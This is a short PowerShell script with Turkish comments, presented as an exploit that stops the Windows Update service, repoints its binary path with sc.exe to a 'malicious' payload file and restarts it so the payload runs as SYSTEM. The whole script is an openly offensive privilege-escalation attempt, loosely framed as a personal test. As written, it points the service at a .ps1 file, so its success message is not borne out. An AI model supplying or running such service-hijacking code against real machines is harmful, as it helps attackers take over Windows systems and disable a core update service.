# Hedef servis adı
$serviceName = "wuauserv"


# Zararlı exe yolu (kendi payload'un, test için)
$maliciousPath = "C:\Users\Enes\Desktop\maclius.ps1"

try {
    Write-Host "[*] Servisi durdurmaya çalışılıyor..."
    sc.exe stop $serviceName | Out-Null
    Start-Sleep -Seconds 2

    Write-Host "[*] Servis exe yolunu değiştirmeye çalışılıyor..."
    $cmd = "sc.exe config $serviceName binPath= `"$maliciousPath`""
    Invoke-Expression $cmd

    Write-Host "[*] Servisi başlatmaya çalışıyor..."
    sc.exe start $serviceName | Out-Null

    Write-Host "[+] Exploit tamamlandı. Zararlı kod SYSTEM olarak çalışıyor olmalı."
}
catch {
    Write-Error "Hata oluştu: $_"
}
